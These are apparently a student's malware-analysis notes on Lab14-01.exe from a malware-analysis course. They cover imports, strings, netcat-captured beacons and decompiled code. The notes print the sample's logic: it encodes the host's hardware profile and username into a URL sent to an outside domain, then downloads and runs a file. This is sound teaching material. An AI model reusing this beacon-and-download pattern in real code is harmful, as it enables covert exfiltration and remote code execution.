Lab14-01.exe
    PE Analysis
        # Virustotal
            16/70
            SHA-256: 6767fd66f28a1d39cb84f59e8a86b3ea99e22d204d2aac821e0d01ac232fba56

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-02-27 17:54:15

            Subsystem: Windows CUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	15990	16384	6.5	7f2be411030d49c452f4388aa67d9ad9
                .rdata	20480	2344	4096	3.63	4baed10b76b025fa3cd2e327e7ba805e
                .data	24576	7772	4096	1.42	bed670bc7103823f76bf186ff88929fb

            IMPORT
                ADVAPI32.dll
                    GetUserNameA
                    GetCurrentHwProfileA
                KERNEL32.dll
                    GetLastError
                    HeapFree
                    GetStdHandle
                    LCMapStringW
                    SetHandleCount
                    GetOEMCP
                    LCMapStringA
                    HeapDestroy
                    ExitProcess
                    GetEnvironmentStringsW
                    FlushFileBuffers
                    GetModuleFileNameA
                    RtlUnwind
                    LoadLibraryA
                    FreeEnvironmentStringsA
                    GetCurrentProcess
                    GetEnvironmentStrings
                    GetCPInfo
                    UnhandledExceptionFilter
                    MultiByteToWideChar
                    FreeEnvironmentStringsW
                    GetCommandLineA
                    GetProcAddress
                    SetStdHandle
                    WideCharToMultiByte
                    GetStringTypeA
                    SetFilePointer
                    WriteFile
                    GetStartupInfoA
                    CloseHandle
                    GetACP
                    HeapReAlloc
                    GetStringTypeW
                    TerminateProcess
                    CreateProcessA
                    HeapCreate
                    VirtualFree
                    Sleep
                    GetFileType
                    HeapAlloc
                    GetVersion
                    VirtualAlloc
                urlmon.dll
                    URLDownloadToCacheFileA                         // The only one network function

        # strings.exe (Only part of the results)
            http://www.practicalmalwareanalysis.com/%s/%c.png
            %c%c:%c%c:%c%c:%c%c:%c%c:%c%c
            %s-%s

    Dynamic Analysis
        # RegShot (Part of results)
            Nothing valuable

        # procexp
            NULL

        # procmon
            Nothing valuable

        # autoruns
            NULL

        # ApateDNS
            www.practicalmalwareanalysis.com
        
        # Netcat
            $ nc -lvvp 80
            Listening on [0.0.0.0] (family 0, port 80)
            Connection from [10.0.0.2] port 80 [tcp/http] accepted (family 2, sport 1179)
            GET /ODA6NmQ6NjE6NzI6Njk6NmYtcHJhY3RpY2Ua/a.png HTTP/1.1
            Accept: */*
            Accept-Encoding: gzip, deflate
            User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)
            Host: www.practicalmalwareanalysis.com
            Connection: Keep-Alive

            $ sudo nc -lvvp 80                                      // On a different machine
            [sudo] password for bc7:
            Listening on [0.0.0.0] (family 0, port 80)
            Connection from localhost 23912 received!
            GET /xxxxa/a.png HTTP/1.1                               // not real for sensitive
            Accept: */*
            Accept-Encoding: gzip, deflate
            User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Zoom 3.6.0)      // Different
            Host: www.practicalmalwareanalysis.com
            Connection: Keep-Alive

        # sc
            NULL

        # IDA Pro & OllyDbg
            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            pcbBuffer = 0x7FFF;
            memset(encode_prof, 0, 0x7FFFu);
            GetCurrentHwProfileA(&HwProfileInfo);
            sprintf(
                &v5,
                aCCCCCCCCCCCC,                              // %c%c:%c%c:%c%c:%c%c:%c%c:%c%c
                ...
            pcbBuffer = 0x7FFF;
            if ( !GetUserNameA(&Buffer, &pcbBuffer) )
                return 0;
            sprintf(&pro_info, aSS, &v5, &Buffer);          // %s-%s
            memset(encode_prof, 0, 0x7FFFu);
            sub_4010BB(&pro_info, (int)encode_prof);        // similar base64
            while ( 1 )
            {
                v7 = downloadRun(encode_prof);
                if ( v7 )
                break;
                Sleep(60000u);
            }
            return 1;
            }

            ODA6NmQ6NjE6NzI6Njk6NmYtcHJhY3RpY2Ua >>>>>> base64decode >>>>>> 80:6d:61:72:69:6f-practice
                            

Analysis
    It's a simple base64encoding of computer profile and username.
